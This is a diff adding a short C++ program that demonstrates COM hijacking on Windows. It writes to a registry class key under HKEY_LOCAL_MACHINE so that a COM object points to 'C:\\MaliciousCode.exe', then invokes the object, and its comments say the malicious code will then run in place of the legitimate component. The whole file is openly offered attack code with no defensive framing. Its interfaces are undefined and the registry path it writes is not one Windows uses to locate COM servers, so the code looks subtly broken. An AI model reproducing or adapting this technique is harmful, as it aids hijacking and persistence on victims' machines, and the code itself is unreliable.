@@ -1,0 +1,25 @@
+#include <Windows.h>
+#include <atlbase.h>
+
+int main()
+{
+    // Modify the Windows Registry to replace the reference to a legitimate system component with the path to the malicious executable
+    HKEY hKey;
+    LONG lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\MyCOMObject", 0, KEY_WRITE, &hKey);
+    if (lResult == ERROR_SUCCESS)
+    {
+        RegSetValueEx(hKey, "", 0, REG_SZ, (BYTE*)"C:\\MaliciousCode.exe", sizeof("C:\\MaliciousCode.exe"));
+        RegCloseKey(hKey);
+    }
+
+    // Use the COM object as normal
+    CComPtr<IMyCOMObject> pMyCOMObject;
+    HRESULT hr = pMyCOMObject.CoCreateInstance(__uuidof(MyCOMObject));
+    if (SUCCEEDED(hr))
+    {
+        // When the COM object is executed, the malicious code will be run instead of the legitimate system component
+        pMyCOMObject->DoSomething();
+    }
+
+    return 0;
+}
